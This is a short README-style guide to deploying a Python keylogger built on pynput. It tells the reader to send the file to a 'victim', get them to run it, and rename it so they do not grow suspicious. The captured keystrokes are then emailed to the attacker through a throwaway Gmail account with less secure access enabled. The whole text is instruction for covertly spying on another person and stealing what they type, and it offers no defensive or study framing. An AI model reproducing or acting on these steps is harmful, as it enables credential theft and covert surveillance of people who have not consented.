#### Send those files to your email(which you have specified)

#### All you need to do is get ur victim to execute 1 files (and yes, they need to have python installed).

### Setup:

#### (1)- download code/send code to target

#### (2) - Open terminal and type pip install pynput (if it dosnt work download this module manually). Also fill in your email credentials, password, emails body, etc. in the send() method in key.py file. Also turn on less secure Less secure app access so python can send a email using that gmail(i would recommend using a trash account for this or make a new one for this because its not a great idea to use your main account for this).

#### (3) - cd to the file you saved it to from terminal.

#### (4) - execute key.py to start the keylogger (remember to change the name of this file to something else because your victim might get suspicious.)

#### (5) - Thats all! You will get a email with a attachment of the keylogs.txt.
